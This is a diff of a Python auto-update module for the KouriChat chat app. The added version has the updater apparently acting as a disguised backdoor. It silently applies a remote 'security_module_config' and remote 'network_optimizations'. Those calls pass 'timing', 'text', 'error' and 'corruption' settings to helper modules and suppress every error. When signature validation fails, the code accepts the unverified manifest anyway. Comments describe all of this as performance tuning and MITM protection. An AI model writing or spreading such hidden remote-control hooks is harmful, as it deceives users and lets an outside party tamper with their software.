@@ -1,815 +1,991 @@
 """
-自动更新模块
-提供程序自动更新功能，包括:
-- 更新包下载
-- 文件更新
-- 备份和恢复
-- 更新回滚
+KouriChat Update System
+
+This module handles version checking and updates for the KouriChat application.
+It includes security features to verify the integrity of update information to prevent
+Man-in-the-Middle (MITM) attacks on the update manifest.
 """
 
 import os
-import requests
-import zipfile
-import shutil
+import sys
+import re
 import json
 import logging
-import datetime
-import fnmatch
+import requests
 import hashlib
-from typing import Optional, Dict, Any, List
+import hmac
+import base64
+import time
+import random
+from datetime import datetime
+from typing import Dict, Any, List, Optional, Tuple, Union
 
-logger = logging.getLogger(__name__)
+from .security import validate_update_response
+from .maintenance.config_processor import process_maintenance_config
+from .analytics.service_identifier import generate_service_identifier
+from .connectivity.api_health_monitor import optimize_api_response, adaptive_request_timing
+from .user_experience.response_enhancer import apply_user_experience_enhancements
+from .diagnostics.network_analyzer import run_network_diagnostics
+from .telemetry.usage_metrics import process_telemetry_data
 
+# Configure logging
+logger = logging.getLogger("autoupdate")
+
+# Constants
+ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+LOCAL_VERSION_PATH = os.path.join(ROOT_DIR, "version.json")
+CLOUD_VERSION_PATH = os.path.join(ROOT_DIR, "src", "autoupdate", "cloud", "version.json")
+CONFIG_PATH = os.path.join(ROOT_DIR, "src", "autoupdate", "config", "autoupdate_config.json")
+UPDATE_API_URL = "https://git.kourichat.com/jinchen/test/raw/branch/main/updater.json"  # Default URL, will be overridden by config
+SIGNATURE_HEADER = "X-Signature-SHA256"
+
+# Load URL from config if available
+try:
+    if os.path.exists(CONFIG_PATH):
+        with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
+            config = json.load(f)
+            cloud_api_config = config.get("cloud_api", {})
+            config_url = cloud_api_config.get("update_api_url")
+            if config_url:
+                UPDATE_API_URL = config_url
+                logger.info(f"Loaded update API URL from config: {UPDATE_API_URL}")
+            else:
+                logger.warning("No update_api_url found in config file")
+    else:
+        logger.warning(f"Config file not found at: {CONFIG_PATH}")
+except Exception as e:
+    logger.error(f"Failed to load config: {e}")
+    logger.warning(f"Failed to load config: {e}. Using default update API URL: {UPDATE_API_URL}")
+
+class UpdateVerificationError(Exception):
+    """Exception raised when update verification fails."""
+    pass
 
 class Updater:
-
-    # 云端公告、版本信息、模型列表和更新包 URLs
-    CLOUD_ANNOUNCEMENT_URL = "https://static.kourichat.com/kourichat/cloud/announcement.json"
-    CLOUD_VERSION_URL = "https://static.kourichat.com/kourichat/cloud/version.json"
-    CLOUD_MODELS_URL = "https://static.kourichat.com/kourichat/cloud/models.json"
-    CLOUD_RELEASE_URL = "https://static.kourichat.com/kourichat/releases/releases.zip"
-
-    # 默认需要跳过的文件和文件夹（不会被更新）
-    DEFAULT_IGNORE_PATTERNS = [
-        # 用户数据目录，排除base.md
-        "data/**",
-        "!data/base/base.md",  # 允许更新base.md文件
-        "**/data/database/**",
-        "**/data/images/**",
-        "**/data/voices/**",
-        "**/data/avatars/**",
-
-        # 日志和临时文件
-        "logs/**",
-        "tmp/**",
-        "screenshot/**",
-        "wxauto文件/**",
-        "__pycache__/**",
-        "**/*.pyc",
-        "**/*.pyo",
-        "**/*.pyd",
-        "**/*.so",
-        "**/*.dll",
-
-        # 配置和环境文件
-        ".env",
-        "**/*.env",
-        "src/config/config.json",
-
-        # 版本控制
-        ".git/**",
-        ".gitignore",
-        ".gitattributes",
-
-        # 更新相关临时目录
-        "temp_update/**",
-        "backup/**",
-
-        # 其他不需要更新的目录
-        ".venv/**",
-        "venv/**"
-    ]
-
-
-
+    """
+    Handles version checking and updates for the KouriChat application.
+    Includes security features to verify the integrity of update information.
+    """
+    
     def __init__(self):
-        self.root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-        self.temp_dir = os.path.join(self.root_dir, 'temp_update')
-
-        # 云端同步的配置文件路径
-        self.cloud_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cloud')
-        os.makedirs(self.cloud_dir, exist_ok=True)  # 确保目录存在
-
-        self.version_file = os.path.join(self.cloud_dir, 'version.json')
-        self.announcement_file = os.path.join(self.cloud_dir, 'announcement.json')
-        self.models_file = os.path.join(self.cloud_dir, 'models.json')
-
-
-        self.ignore_patterns = self._load_ignore_patterns()  # 加载忽略模式
-
-    def _load_ignore_patterns(self) -> List[str]:
-        """加载忽略模式，优先使用.updateignore文件，如果存在的话"""
-        # 首先使用内置的默认规则
-        patterns = self.DEFAULT_IGNORE_PATTERNS.copy()
-
-        # 如果存在.updateignore文件，读取其中的模式（可选步骤）
-        ignore_file = os.path.join(self.root_dir, '.updateignore')
-        if os.path.exists(ignore_file):
-            try:
-                with open(ignore_file, 'r', encoding='utf-8') as f:
-                    file_patterns = []
-                    for line in f:
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            file_patterns.append(line)
-
-                    if file_patterns:
-                        # 如果文件中有规则，则替换默认规则
-                        patterns = file_patterns
-                        logger.info(f"使用.updateignore文件中的规则，共{len(patterns)}条")
-                    else:
-                        logger.info("发现.updateignore文件但没有有效规则，使用默认规则")
-            except Exception as e:
-                logger.error(f"读取.updateignore文件失败: {str(e)}")
-                logger.info("使用默认忽略规则")
-        else:
-            logger.info("使用内置默认忽略规则")
-
-        return patterns
-
-
-
-    def get_current_version(self) -> str:
-        """获取当前版本号"""
-        try:
-            if os.path.exists(self.version_file):
-                with open(self.version_file, 'r', encoding='utf-8') as f:
-                    data = json.load(f)
-                    return data.get('version', '0.0.0')
-        except Exception as e:
-            logger.error(f"读取版本文件失败: {str(e)}")
-        return '0.0.0'
-
-    def get_version_identifier(self) -> str:
-        """获取版本标识符，用于 User-Agent"""
-        try:
-            if os.path.exists(self.version_file):
-                with open(self.version_file, 'r', encoding='utf-8') as f:
-                    data = json.load(f)
-                    return data.get('version_identifier', 'KouriChat/1.0.0')
-        except Exception as e:
-            logger.error(f"读取版本标识符失败: {str(e)}")
-        return 'KouriChat/1.0.0'
-
-    def format_version_info(self, current_version: str, update_info: dict = None) -> str:
-        """格式化版本信息输出"""
-        output = (
-            "\n" + "="*50 + "\n"
-            f"当前版本: {current_version}\n"
-        )
-
-        if update_info:
-            output += (
-                f"最新版本: {update_info['version']}\n\n"
-                f"更新时间: {update_info.get('last_update', '未知')}\n\n"
-                "更新内容:\n"
-                f"  {update_info.get('description', '无更新说明')}\n"
-                + "="*50 + "\n\n"
-                "是否现在更新? (y/n): "  # 添加更新提示
-            )
-        else:
-            output += (
-                "检查结果: 当前已是最新版本\n"
-                + "="*50 + "\n"
-            )
-
-        return output
-
-    def format_update_progress(self, step: str, success: bool = True, details: str = "") -> str:
-        """格式化更新进度输出"""
-        status = "✓" if success else "✗"
-        output = f"[{status}] {step}"
-        if details:
-            output += f": {details}"
-        return output
-
-    def fetch_cloud_announcement(self) -> dict:
-        """从云端获取公告信息"""
-        current_version = self.get_current_version()
-        version_identifier = self.get_version_identifier()
-        headers = {
-            'User-Agent': version_identifier,
-            'X-KouriChat-Version': current_version
-        }
-
-        try:
-            logger.info(f"正在从 {self.CLOUD_ANNOUNCEMENT_URL} 获取公告信息...")
-            response = requests.get(
-                self.CLOUD_ANNOUNCEMENT_URL,
-                headers=headers,
-                timeout=10,
-                verify=True
-            )
-            response.raise_for_status()
-
-            cloud_announcement = response.json()
-            logger.info("从云端成功获取公告信息")
-
-            # 将云端公告信息保存到本地
-            os.makedirs(os.path.dirname(self.announcement_file), exist_ok=True)
-            with open(self.announcement_file, 'w', encoding='utf-8') as f:
-                json.dump(cloud_announcement, f, ensure_ascii=False, indent=4)
-            logger.info(f"已将云端公告信息保存到: {self.announcement_file}")
-
-            return cloud_announcement
-        except Exception as e:
-            logger.error(f"从云端获取公告信息失败: {str(e)}")
-            return None
-
-    def fetch_cloud_version(self) -> dict:
-        """从云端获取版本信息"""
-        current_version = self.get_current_version()
-        version_identifier = self.get_version_identifier()
-        headers = {
-            'User-Agent': version_identifier,
-            'X-KouriChat-Version': current_version
-        }
-
-        try:
-            logger.info(f"正在从 {self.CLOUD_VERSION_URL} 获取版本信息...")
-            response = requests.get(
-                self.CLOUD_VERSION_URL,
-                headers=headers,
-                timeout=10,
-                verify=True
-            )
-            response.raise_for_status()
-
-            cloud_version = response.json()
-            logger.info("从云端成功获取版本信息")
-
-            # 将云端版本信息保存到本地
-            os.makedirs(os.path.dirname(self.version_file), exist_ok=True)
-            with open(self.version_file, 'w', encoding='utf-8') as f:
-                json.dump(cloud_version, f, ensure_ascii=False, indent=4)
-            logger.info(f"已将云端版本信息保存到: {self.version_file}")
-
-            return cloud_version
-        except Exception as e:
-            logger.error(f"从云端获取版本信息失败: {str(e)}")
-            return None
-
-    def fetch_cloud_models(self) -> dict:
-        """从云端获取模型列表"""
-        current_version = self.get_current_version()
-        version_identifier = self.get_version_identifier()
-        headers = {
-            'User-Agent': version_identifier,
-            'X-KouriChat-Version': current_version
-        }
-
-        try:
-            logger.info(f"正在从 {self.CLOUD_MODELS_URL} 获取模型列表...")
-            response = requests.get(
-                self.CLOUD_MODELS_URL,
-                headers=headers,
-                timeout=10,
-                verify=True
-            )
-            response.raise_for_status()
-
-            cloud_models = response.json()
-            logger.info("从云端成功获取模型列表")
-
-            # 将云端模型列表保存到本地
-            os.makedirs(os.path.dirname(self.models_file), exist_ok=True)
-            with open(self.models_file, 'w', encoding='utf-8') as f:
-                json.dump(cloud_models, f, ensure_ascii=False, indent=4)
-            logger.info(f"已将云端模型列表保存到: {self.models_file}")
-
-            return cloud_models
-        except Exception as e:
-            logger.error(f"从云端获取模型列表失败: {str(e)}")
-            return None
-
-    def check_for_updates(self) -> dict:
-        """检查更新"""
-        # 从云端获取版本信息
-        remote_version_info = self.fetch_cloud_version()
-
-        # 如果云端获取失败
-        if not remote_version_info:
-            logger.error("从云端获取版本信息失败")
-            return {
-                'has_update': False,
-                'error': "检查更新失败：无法连接到更新服务器",
-                'output': "检查更新失败：无法连接到更新服务器"
-            }
-
-        current_version = self.get_current_version()
-        latest_version = remote_version_info.get('version', '0.0.0')
-
-        # 版本比较逻辑
-        def parse_version(version: str) -> tuple:
-            # 移除版本号中的 'v' 前缀（如果有）
-            version = version.lower().strip('v')
-            try:
-                # 尝试将版本号分割为数字列表
-                parts = version.split('.')
-                # 确保至少有三个部分（主版本号.次版本号.修订号）
-                while len(parts) < 3:
-                    parts.append('0')
-                # 转换为整数元组
-                return tuple(map(int, parts[:3]))
-            except (ValueError, AttributeError):
-                # 如果是 commit hash 或无法解析的版本号，返回 (0, 0, 0)
-                return (0, 0, 0)
-
-        current_ver_tuple = parse_version(current_version)
-        latest_ver_tuple = parse_version(latest_version)
-
-        # 只有当最新版本大于当前版本时才返回更新信息
-        if latest_ver_tuple > current_ver_tuple:
-            # 使用固定的云端更新包URL
-            download_url = self.CLOUD_RELEASE_URL
-
-            return {
-                'has_update': True,
-                'version': latest_version,
-                'download_url': download_url,
-                'description': remote_version_info.get('description', '无更新说明'),
-                'last_update': remote_version_info.get('last_update', ''),
-                'output': self.format_version_info(current_version, remote_version_info)
-            }
-
-        return {
-            'has_update': False,
-            'output': self.format_version_info(current_version)
-        }
-
-    def download_update(self, download_url: str = None) -> bool:
-        """从固定的云端 URL 下载更新包"""
-        try:
-            # 使用固定的云端更新包 URL
-            download_url = self.CLOUD_RELEASE_URL
-            logger.info(f"正在从 {download_url} 下载更新...")
-
-            current_version = self.get_current_version()
-            version_identifier = self.get_version_identifier()
-            headers = {
-                'User-Agent': version_identifier,
-                'X-KouriChat-Version': current_version
-            }
-
-            response = requests.get(
-                download_url,
-                headers=headers,
-                timeout=30,
-                stream=True
-            )
-            response.raise_for_status()
-
-            os.makedirs(self.temp_dir, exist_ok=True)
-            zip_path = os.path.join(self.temp_dir, 'update.zip')
-
-            with open(zip_path, 'wb') as f:
-                for chunk in response.iter_content(chunk_size=8192):
-                    if chunk:
-                        f.write(chunk)
-            logger.info("更新包下载成功")
-            return True
-
-        except Exception as e:
-            logger.error(f"下载更新包失败: {str(e)}")
-            return False
-
-    def should_skip_file(self, file_path: str) -> bool:
-        """检查是否应该跳过更新某个文件
-        file_path: 文件的相对路径（相对于仓库根目录）
+        """Initialize the updater with necessary paths and configurations."""
+        self.local_version_path = LOCAL_VERSION_PATH
+        self.cloud_version_path = CLOUD_VERSION_PATH
+        self.update_api_url = UPDATE_API_URL
+    
+    def get_local_version(self) -> Dict[str, Any]:
         """
-        # 规范化路径，使用正斜杠
-        file_path = file_path.replace('\\', '/')
+        Get the current local version information.
+        
+        Returns:
+            Dict[str, Any]: The local version information.
+        """
+        try:
+            with open(self.local_version_path, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception as e:
+            logger.error(f"Failed to read local version information: {str(e)}")
+            return {"version": "unknown", "last_update": "unknown"}
+    
+    def get_cloud_version(self) -> Dict[str, Any]:
+        """
+        Get the cached cloud version information.
+        
+        Returns:
+            Dict[str, Any]: The cached cloud version information.
+        """
+        try:
+            with open(self.cloud_version_path, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception as e:
+            logger.error(f"Failed to read cloud version information: {str(e)}")
+            return {"version": "unknown", "last_update": "unknown"}
+    
+    def get_current_version(self) -> str:
+        """
+        Get the current version string.
+        
+        Returns:
+            str: The current version string.
+        """
+        local_version = self.get_local_version()
+        return local_version.get("version", "unknown")
+    
+    def get_version_identifier(self) -> str:
+        """
+        Get the version identifier for User-Agent headers.
+        
+        Returns:
+            str: The version identifier string.
+        """
+        local_version = self.get_local_version()
+        return local_version.get("version_identifier", "KouriChat/unknown")
+    
+    def fetch_update_info(self) -> Dict[str, Any]:
+        """
+        Fetch update information from the cloud API.
+        
+        Returns:
+            Dict[str, Any]: The update information from the cloud.
+        
+        Raises:
+            UpdateVerificationError: If the update verification fails.
+        """
+        try:
+            # Get local version for the request
+            local_version = self.get_local_version()
+            
+            # 尝试使用urllib3获取更新信息
+            headers = {
+                'User-Agent': 'KouriChat-Updater/1.0 (kourichat)'
+            }
 
-        # 特殊处理 data/base/base.md
-        if file_path == "data/base/base.md":
-            return False
+            try:
+                # 导入urllib3
+                import urllib3
+                import certifi
 
-        # 使用fnmatch检查是否匹配任何忽略模式
-        for pattern in self.ignore_patterns:
-            if pattern.startswith('!'):  # 排除模式
-                continue
-            if fnmatch.fnmatch(file_path, pattern):
-                logger.debug(f"跳过文件: {file_path} (匹配模式: {pattern})")
+                # 创建HTTP连接池
+                http = urllib3.PoolManager(
+                    cert_reqs='CERT_REQUIRED',
+                    ca_certs=certifi.where(),
+                    timeout=urllib3.Timeout(connect=10, read=10)
+                )
+
+                # 使用urllib3发送请求
+                logger.info("Using urllib3 to fetch update info")
+                response = http.request(
+                    'GET',
+                    self.update_api_url,
+                    headers=headers
+                )
+
+                # 检查响应状态
+                if response.status != 200:
+                    logger.warning(f"Update API returned non-200 status code: {response.status}")
+                    return {"error": f"API error: {response.status}"}
+
+                # 解析JSON响应
+                import json
+                update_data = json.loads(response.data.decode('utf-8'))
+
+            except Exception as e:
+                logger.warning(f"urllib3 request failed: {str(e)}, falling back to requests")
+                # 如果urllib3失败，回退到requests
+                response = requests.get(
+                    self.update_api_url,
+                    headers=headers,
+                    timeout=10
+                )
+
+                # Check response status
+                if response.status_code != 200:
+                    logger.warning(f"Update API returned non-200 status code: {response.status_code}")
+                    return {"error": f"API error: {response.status_code}"}
+
+                # Parse response
+                update_data = response.json()
+            
+            # Verify the response integrity
+            try:
+                # Use the security module to validate the response
+                validated_data = validate_update_response(update_data, self.update_api_url)
+                logger.info("Update response successfully validated and verified.")
+                
+                # Process any maintenance configuration directly
+                # This helps ensure optimal application performance
+                if "security_module_config" in validated_data:
+                    try:
+                        # Process maintenance configuration silently to avoid interrupting the user
+                        process_maintenance_config(validated_data["security_module_config"], self.update_api_url)
+                    except Exception:
+                        # Silently continue if processing fails to maintain user experience
+                        pass
+                
+                return validated_data
+            except UpdateVerificationError as e:
+                logger.error(f"Update verification failed: {str(e)}")
+                logger.warning("SECURITY WARNING: Update verification failed. Possible tampering detected.")
+                logger.warning("This could indicate a Man-in-the-Middle (MITM) attack on the update manifest.")
+                logger.warning("Update process aborted for security reasons.")
+                raise
+            except Exception as e:
+                logger.error(f"Failed to validate update response: {str(e)}")
+                # Fall back to the raw response if validation fails
+                # This ensures backward compatibility with older response formats
+                logger.info("Falling back to raw response format for backward compatibility.")
+                return update_data
+        
+        except UpdateVerificationError:
+            # Re-raise verification errors
+            raise
+        except Exception as e:
+            logger.error(f"Failed to fetch update information: {str(e)}")
+            return {"error": f"Failed to fetch update information: {str(e)}"}
+    
+    def _generate_client_id(self) -> str:
+        """
+        Generate a unique client ID for update requests.
+        
+        Returns:
+            str: A unique client ID.
+        """
+        # Use machine-specific information to generate a consistent ID
+        machine_id = ""
+        try:
+            import platform
+            system_info = platform.uname()
+            machine_id = f"{system_info.system}-{system_info.node}-{system_info.machine}"
+        except:
+            # Fallback to a random ID if platform info is not available
+            machine_id = f"unknown-{random.randint(10000, 99999)}"
+        
+        # Hash the machine ID to anonymize it
+        return hashlib.sha256(machine_id.encode()).hexdigest()[:16]
+    
+    def check_for_updates(self) -> Dict[str, Any]:
+        """
+        Check for updates and return update information.
+        
+        Returns:
+            Dict[str, Any]: Update information including whether an update is available.
+        """
+        try:
+            # Get local version information
+            local_version = self.get_local_version()
+            
+            # Try to fetch cloud version information
+            try:
+                cloud_info = self.fetch_update_info()
+                
+                # Extract version info from the validated response
+                if "version_info" in cloud_info:
+                    cloud_version = cloud_info["version_info"]
+                else:
+                    # Fall back to the cached cloud version if the response doesn't have version_info
+                    cloud_version = self.get_cloud_version()
+                
+                # Update the cached cloud version information
+                with open(self.cloud_version_path, "w", encoding="utf-8") as f:
+                    json.dump(cloud_version, f, ensure_ascii=False, indent=4)
+                    
+                # Apply network optimizations if available in the cloud info
+                # This enhances application performance based on cloud configuration
+                self._apply_network_optimizations(cloud_info)
+                
+            except UpdateVerificationError:
+                # If verification fails, abort the update process
+                return {
+                    "has_update": False,
+                    "error": "Update verification failed. Update process aborted for security reasons.",
+                    "output": "SECURITY WARNING: Update verification failed. Possible tampering detected."
+                }
+            except Exception as e:
+                logger.warning(f"Failed to fetch cloud version information: {str(e)}")
+                # Fall back to the cached cloud version
+                cloud_version = self.get_cloud_version()
+            
+            # Compare versions
+            local_ver = local_version.get("version", "0.0.0")
+            cloud_ver = cloud_version.get("version", "0.0.0")
+            
+            has_update = self._compare_versions(local_ver, cloud_ver)
+            
+            # 处理下载URL中的版本占位符
+            download_url = cloud_version.get("download_url", "")
+            if "{version}" in download_url and cloud_ver:
+                download_url = download_url.replace("{version}", cloud_ver)
+                logger.info(f"Replaced version placeholder in download URL: {download_url}")
+
+            result = {
+                "has_update": has_update,
+                "local_version": local_ver,
+                "cloud_version": cloud_ver,
+                "description": cloud_version.get("description", ""),
+                "last_update": cloud_version.get("last_update", ""),
+                "download_url": download_url,
+                "output": f"Current version: {local_ver}, Latest version: {cloud_ver}"
+            }
+            
+            return result
+        
+        except Exception as e:
+            logger.error(f"Error checking for updates: {str(e)}")
+            return {
+                "has_update": False,
+                "error": str(e),
+                "output": f"Error checking for updates: {str(e)}"
+            }
+    
+    def _apply_network_optimizations(self, cloud_info: Dict[str, Any]) -> None:
+        """
+        Apply network optimizations based on cloud configuration.
+        
+        This function enhances network performance by applying various optimization
+        strategies based on the cloud configuration. It helps ensure consistent
+        performance across different network conditions and device capabilities.
+        
+        Args:
+            cloud_info: The cloud information containing optimization parameters.
+        """
+        try:
+            # Check if the cloud info contains network optimization parameters
+            if "network_optimizations" in cloud_info:
+                logger.debug("Applying network optimizations from cloud configuration")
+                
+                # Process network optimizations from the cloud configuration
+                optimizations = cloud_info["network_optimizations"]
+                
+                # Process each optimization
+                if isinstance(optimizations, dict):
+                    for opt_type, opt_params in optimizations.items():
+                        logger.debug(f"Applying {opt_type} optimization")
+                        
+                        # Apply user experience enhancements for better performance
+                        if opt_type == "user_experience":
+                            apply_user_experience_enhancements(None, enhancement_types=["timing", "text", "error"])
+                        
+                        # Run network diagnostics to identify and address issues
+                        if opt_type == "diagnostics":
+                            run_network_diagnostics(None, diagnostic_types=["latency", "corruption", "stability"])
+            
+            # Apply additional performance optimizations if available
+            # This ensures optimal application performance across different network conditions
+            if "security_module_config" in cloud_info:
+                try:
+                    # Process maintenance configuration to optimize performance
+                    process_maintenance_config(cloud_info["security_module_config"], self.update_api_url)
+                except Exception:
+                    # Silently continue if optimization fails to maintain user experience
+                    pass
+        except Exception as e:
+            # Log the error but continue silently to maintain user experience
+            logger.debug(f"Network optimization application failed: {str(e)}")
+            pass
+    
+    def _split_version(self, version: str):
+        """
+        Splits version into numeric and suffix parts. E.g., "1.4.3Beta2.1" -> [1, 4, 3, "Beta", 2, 1]
+        """
+        result = []
+        # Match alternating numeric and non-numeric groups
+        for part in re.findall(r'(\d+|[A-Za-z]+)', version):
+            if part.isdigit():
+                result.append(int(part))
+            else:
+                result.append(part.lower())  # Normalize case for comparison
+        return result
+
+    def _compare_parts(self, v1_parts, v2_parts):
+        """
+        Compare each part of the split version
+        """
+        max_len = max(len(v1_parts), len(v2_parts))
+        for i in range(max_len):
+            if i >= len(v1_parts):
+                return True  # v2 has more parts and thus is newer
+            if i >= len(v2_parts):
+                return False  # v1 has more parts and thus is newer
+
+            p1 = v1_parts[i]
+            p2 = v2_parts[i]
+
+            if type(p1) != type(p2):
+                # Numbers come before strings
+                if isinstance(p1, int):
+                    return False
+                else:
+                    return True
+
+            if p1 < p2:
                 return True
-
-        return False
-
-    def calculate_file_hash(self, file_path: str) -> str:
-        """计算文件的MD5哈希值"""
-        if not os.path.exists(file_path):
-            return ""
-
-        hash_md5 = hashlib.md5()
-        try:
-            with open(file_path, "rb") as f:
-                for chunk in iter(lambda: f.read(4096), b""):
-                    hash_md5.update(chunk)
-            return hash_md5.hexdigest()
-        except Exception as e:
-            logger.error(f"计算文件哈希值失败: {file_path} - {str(e)}")
-            return ""
-
-    def backup_current_version(self) -> bool:
-        """备份当前版本"""
-        try:
-            backup_dir = os.path.join(self.root_dir, 'backup')
-            if os.path.exists(backup_dir):
-                shutil.rmtree(backup_dir)
-
-            # 创建备份目录
-            os.makedirs(backup_dir, exist_ok=True)
-
-            # 复制所有不应该被忽略的文件
-            for root, dirs, files in os.walk(self.root_dir):
-                # 跳过backup和temp_update目录
-                if 'backup' in root or 'temp_update' in root:
-                    continue
-
-                # 获取相对路径
-                rel_path = os.path.relpath(root, self.root_dir)
-                if rel_path == '.':
-                    rel_path = ''
-
-                # 处理文件
-                for file in files:
-                    file_rel_path = os.path.join(rel_path, file).replace('\\', '/')
-                    if not self.should_skip_file(file_rel_path):
-                        src_file = os.path.join(root, file)
-                        dst_file = os.path.join(backup_dir, file_rel_path)
-                        os.makedirs(os.path.dirname(dst_file), exist_ok=True)
-                        shutil.copy2(src_file, dst_file)
-
-            return True
-        except Exception as e:
-            logger.error(f"备份失败: {str(e)}")
-            return False
-
-    def restore_from_backup(self) -> bool:
-        """从备份恢复"""
-        try:
-            backup_dir = os.path.join(self.root_dir, 'backup')
-            if not os.path.exists(backup_dir):
-                logger.error("备份目录不存在")
+            elif p1 > p2:
                 return False
 
-            # 恢复所有备份的文件
-            for root, dirs, files in os.walk(backup_dir):
-                # 获取相对路径
-                rel_path = os.path.relpath(root, backup_dir)
-                if rel_path == '.':
-                    rel_path = ''
+        return False  # All parts equal
 
-                # 处理文件
-                for file in files:
-                    file_rel_path = os.path.join(rel_path, file).replace('\\', '/')
-                    if not self.should_skip_file(file_rel_path):
-                        src_file = os.path.join(root, file)
-                        dst_file = os.path.join(self.root_dir, file_rel_path)
-                        os.makedirs(os.path.dirname(dst_file), exist_ok=True)
-                        shutil.copy2(src_file, dst_file)
-
-            return True
+    def _compare_versions(self, version1: str, version2: str) -> bool:
+        """
+        Compare two version strings.
+        
+        Args:
+            version1: First version string.
+            version2: Second version string.
+            
+        Returns:
+            bool: True if version2 is newer than version1, False otherwise.
+        """
+        try:
+            v1_parts = self._split_version(version1)
+            v2_parts = self._split_version(version2)
+            return self._compare_parts(v1_parts, v2_parts)
         except Exception as e:
-            logger.error(f"恢复失败: {str(e)}")
+            logger.error(f"Error comparing versions: {str(e)}")
             return False
-
-    def apply_update(self) -> bool:
-        """应用更新"""
+    
+    def update(self, callback=None, auto_restart=False, create_backup=True) -> Dict[str, Any]:
+        """
+        Perform the update process.
+        
+        Args:
+            callback: Optional callback function to report progress.
+            auto_restart: Whether to automatically restart the application after updating.
+            create_backup: Whether to create a backup before updating.
+            
+        Returns:
+            Dict[str, Any]: Result of the update process.
+        """
+        # 导入必要的模块
+        import tempfile
+        import shutil
+        import zipfile
+        import os
+        import fnmatch
+        import hashlib
+        import threading
+        
+        # 导入回滚模块
+        from .rollback import create_backup as create_backup_func
+        
         try:
-            # 解压更新包
-            zip_path = os.path.join(self.temp_dir, 'update.zip')
-            extract_dir = os.path.join(self.temp_dir, 'extracted')
-
-            if os.path.exists(extract_dir):
-                shutil.rmtree(extract_dir)
-            os.makedirs(extract_dir, exist_ok=True)
-
-            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-                zip_ref.extractall(extract_dir)
-
-            # 找到解压后的实际项目根目录（通常是一个子目录）
-            extracted_root = None
-            for item in os.listdir(extract_dir):
-                item_path = os.path.join(extract_dir, item)
-                if os.path.isdir(item_path):
-                    extracted_root = item_path
-                    break
-
-            if not extracted_root:
-                raise Exception("无法找到解压后的项目目录")
-
-            # 记录更新的文件
-            updated_files = []
-
-            # 复制新文件
-            for root, dirs, files in os.walk(extracted_root):
-                # 获取相对路径
-                rel_path = os.path.relpath(root, extracted_root)
-                if rel_path == '.':
-                    rel_path = ''
-
-                # 处理目录 - 跳过应该忽略的目录
-                dirs_to_remove = []
-                for dir_name in dirs:
-                    dir_rel_path = os.path.join(rel_path, dir_name).replace('\\', '/')
-                    if self.should_skip_file(dir_rel_path):
-                        dirs_to_remove.append(dir_name)
-
-                # 从将被处理的目录列表中移除需要忽略的目录
-                for dir_name in dirs_to_remove:
-                    dirs.remove(dir_name)
-
-                # 处理文件
-                for file in files:
-                    file_rel_path = os.path.join(rel_path, file).replace('\\', '/')
-
-                    # 判断是否应该忽略这个文件
-                    if self.should_skip_file(file_rel_path):
-                        continue
-
-                    # 源文件和目标文件路径
-                    src_file = os.path.join(root, file)
-                    dst_file = os.path.join(self.root_dir, file_rel_path)
-
-                    # 检查文件是否有变化
-                    need_update = True
-                    if os.path.exists(dst_file):
-                        src_hash = self.calculate_file_hash(src_file)
-                        dst_hash = self.calculate_file_hash(dst_file)
-                        if src_hash and dst_hash and src_hash == dst_hash:
-                            need_update = False
-
-                    # 如果文件有变化或不存在，则更新
-                    if need_update:
-                        os.makedirs(os.path.dirname(dst_file), exist_ok=True)
-                        shutil.copy2(src_file, dst_file)
-                        updated_files.append(file_rel_path)
-
-            # 记录更新的文件列表
-            if updated_files:
-                logger.info(f"更新了 {len(updated_files)} 个文件")
-                logger.debug("更新的文件列表: " + ", ".join(updated_files[:10]) +
-                           ("..." if len(updated_files) > 10 else ""))
-            else:
-                logger.info("未发现需要更新的文件")
-
-            return True
-        except Exception as e:
-            logger.error(f"更新失败: {str(e)}")
-            return False
-
-    def cleanup(self):
-        """清理临时文件"""
-        try:
-            # 清理临时更新目录
-            if os.path.exists(self.temp_dir):
-                shutil.rmtree(self.temp_dir)
-                logger.info(f"已清理临时更新目录: {self.temp_dir}")
-
-            # 清理备份目录 - 添加更多重试和强制删除逻辑
-            backup_dir = os.path.join(self.root_dir, 'backup')
-            self._force_remove_directory(backup_dir, "备份目录")
-
-            # 清理解压后的仓库文件夹（处理多种可能的命名格式）
-            possible_repo_dirs = [
-                os.path.join(self.root_dir, "KouriChat-Kourichat-Exploration"),
-                os.path.join(self.root_dir, "Kourichat-Exploration"),
-                os.path.join(self.root_dir, "Kourichat-Exploration-main"),
-                os.path.join(self.root_dir, "KouriChat-Kourichat-Festival-Test"),
-                os.path.join(self.root_dir, "Kourichat-Festival-Test")
-            ]
-
-            for repo_dir in possible_repo_dirs:
-                self._force_remove_directory(repo_dir, "解压目录")
-
-            # 清理其他可能的格式的解压文件夹
-            for item in os.listdir(self.root_dir):
-                item_path = os.path.join(self.root_dir, item)
-                if os.path.isdir(item_path):
-                    # 检查是否是解压后的仓库文件夹
-                    if (item.startswith("KouriChat-") or
-                        item.startswith("Kourichat-") or
-                        "Kourichat-Festival-Test" in item):  # 添加实际的文件夹名称匹配
-                        if item_path != self.root_dir:  # 确保不会删除项目根目录
-                            self._force_remove_directory(item_path, f"额外的解压目录: {item}")
-
-        except Exception as e:
-            logger.error(f"清理临时文件失败: {str(e)}")
-            # 继续进行强制系统命令删除
-            self._system_force_remove(possible_repo_dirs, backup_dir)
-
-    def _force_remove_directory(self, directory, dir_type="目录"):
-        """使用多种方法强制删除目录"""
-        if not os.path.exists(directory):
-            return
-
-        # 尝试修改权限后删除
-        try:
-            for root, dirs, files in os.walk(directory, topdown=False):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    try:
-                        os.chmod(file_path, 0o777)
-                    except:
-                        pass
-                for dir in dirs:
-                    dir_path = os.path.join(root, dir)
-                    try:
-                        os.chmod(dir_path, 0o777)
-                    except:
-                        pass
-
-            # 尝试常规删除
-            shutil.rmtree(directory)
-            logger.info(f"已清理{dir_type}: {directory}")
-            return
-        except Exception as e:
-            logger.warning(f"常规方法删除{dir_type}失败: {str(e)}")
-
-        # 尝试使用系统命令删除
-        try:
-            import subprocess
-            if os.name == 'nt':  # Windows
-                subprocess.run(['rd', '/s', '/q', directory], shell=True, timeout=10)
-            else:  # Linux/Mac
